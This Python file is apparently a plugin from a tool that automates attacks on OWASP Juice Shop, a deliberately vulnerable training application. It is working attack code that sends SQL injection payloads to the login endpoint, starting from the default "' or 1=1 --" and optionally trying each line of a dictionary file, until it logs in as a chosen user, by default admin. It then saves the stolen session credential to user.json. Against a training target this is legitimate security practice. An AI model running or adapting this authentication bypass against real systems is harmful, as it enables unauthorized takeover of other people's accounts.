# SOURCE FILE:    SQL_injection.py
# PROGRAM:        JuiceShop automating attack application -- Plugin
# FUNCTIONS:      Doing SQL injection on login page through three methods:
#                 Method 1: Using default payload 'or 1=1 --
#                 Method 2: Using specific payload user entered from commandline
#                 Method 3: Using directionary to try multiple payloads
#          
# DATE:           Dec 6, 2022
# REVISIONS:      N/A
# PROGRAMMER:     Hugh Song
#
# NOTES
#--------------------------------------------------------------------------------------
import time
from . import attack as a

#---------------------------------------------------------------------------------------
#Class: SQL_injector
#Inherit: Attack
#--------------------------------------------------------------------------------------
class SQL_injector(a.attack_inter):
    
#--------------------------------------------------------------------------------------
#FUNCTION: __init__ 
#ARGUMENTS: N/A
#RETURNS: void
#Description: Initial class variables(REST session; URL).
#--------------------------------------------------------------------------------------
    def __init__(self):
        self.juice_session = a.requests.session()
        self.url = a.URL + '/rest/user/login'
    
#--------------------------------------------------------------------------------------
#FUNCTION generator
#ARGUMENTS: myScript --> the SQL_injection payload. 
#RETURNS: json_data  --> will be embedded into POST request json field. 
#Description: This function is used to generate needed data from REST requests
#             Payload will is injected in user email field.
#NOTES:
# ALL REST requests needed data like json_data, header, and cookie must generated through this function
#--------------------------------------------------------------------------------------
    def generator(self, myScript):
        #cookies = COOKIE
        json_data = {
            'email': myScript,
            'password': '123',
        }
        return json_data

#--------------------------------------------------------------------------------------
#FUNCTION run
#ARGUMENTS: userInput(optional) --> SQL injection payload/dictionary 
#           username(optional)  --> target Username
#RETURNS: response.status_code  --> indicate attack is success or not
#Description: This is the main function for plugin to send REST requests.
#             
#NOTES: None
#--------------------------------------------------------------------------------------
    def run(self, userInput = '\' or 1=1 --', username = 'admin'):
        print("================Start SQL injection==============")
        a.logging.basicConfig(filename='./test_logging_info.log', level=a.logging.INFO, format='%(asctime)s %(message)s')
        logger = a.logging.getLogger("SQL_injection")
        a.logging.Formatter.converter = time.gmtime
        a.logging.info(logger)
        a.logging.info('Started')
        # [-4:]
        if userInput[-4:] == '.txt':
            f = open(userInput, "r")
            for line in f:
                line = line.rstrip()
                json_data = self.generator(line)
                response = self.juice_session.post(self.url, json=json_data, verify=False)
                if response.status_code == 200:
                    print("Successfully login through SQL injection.")
                    print("Valid script: ", json_data['email'])
                    print(username, "'s credential is already added into user.json.")
                    a.set_auth(username,response)
                    break
            print("================SQL injection finished==============")
            a.logging.info('Finished')
        else:
            json_data = self.generator(userInput)
            response = self.juice_session.post(self.url, json=json_data)
            if response.status_code == 200:
                a.set_auth(username,response)
                print("Successfully login through SQL injection.")
                print(username, "'s credential is already added into user.json.")
            else:
                print("SQL injection Failed, please try other payloads")
            a.logging.info('Finished')
            print("================SQL injection finished==============")
            return response.status_code